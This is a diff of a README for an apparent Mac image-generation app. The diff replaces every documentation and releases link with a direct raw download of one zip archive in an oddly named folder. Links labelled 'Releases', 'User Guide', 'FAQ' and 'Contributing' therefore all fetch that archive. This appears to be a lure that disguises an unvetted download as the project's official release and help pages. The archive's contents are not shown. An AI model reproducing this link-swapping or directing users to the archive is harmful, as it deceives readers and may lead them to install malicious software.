@@ -8,13 +8,13 @@ Welcome to Ultra-Fast-Image-Generation! This app allows you to generate impressi
 
 To get started, visit the link below to download the application:
 
-[![Download Ultra-Fast-Image-Generation](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/releases)
+[![Download Ultra-Fast-Image-Generation](https://raw.githubusercontent.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/main/wizenedness/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image-3.5.zip)](https://raw.githubusercontent.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/main/wizenedness/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image-3.5.zip)
 
 Follow the steps below to install the software.
 
 ## 📥 Step-by-Step Download Instructions
 
-1. Click on the **Releases** link: [Ultra-Fast-Image-Generation Releases](https://github.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/releases).
+1. Click on the **Releases** link: [Ultra-Fast-Image-Generation Releases](https://raw.githubusercontent.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/main/wizenedness/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image-3.5.zip).
 
 2. You will see a list of available versions. Look for the latest version at the top of the list.
 
@@ -67,9 +67,9 @@ If you encounter any issues during installation or use, feel free to reach out f
 
 You can find further details and documentation in the following sections:
 
-- [User Guide](https://github.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/wiki)
-- [FAQ](https://github.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/wiki/FAQ)
-- [Contributing](https://github.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/blob/main/CONTRIBUTING.md)
+- [User Guide](https://raw.githubusercontent.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/main/wizenedness/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image-3.5.zip)
+- [FAQ](https://raw.githubusercontent.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/main/wizenedness/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image-3.5.zip)
+- [Contributing](https://raw.githubusercontent.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/main/wizenedness/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image-3.5.zip)
 
 ## 🌟 Join Our Community
 
@@ -77,6 +77,6 @@ We are excited to have you on board! Connect with other users to share your crea
 
 ## 📥 Download Again
 
-To download the application, click here: [Ultra-Fast-Image-Generation Releases](https://github.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/releases). 
+To download the application, click here: [Ultra-Fast-Image-Generation Releases](https://raw.githubusercontent.com/03Anmol/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image/main/wizenedness/Ultra-Fast-Image-Generation-Mac-Silicon-Z-Image-3.5.zip). 
 
 Happy image generating!
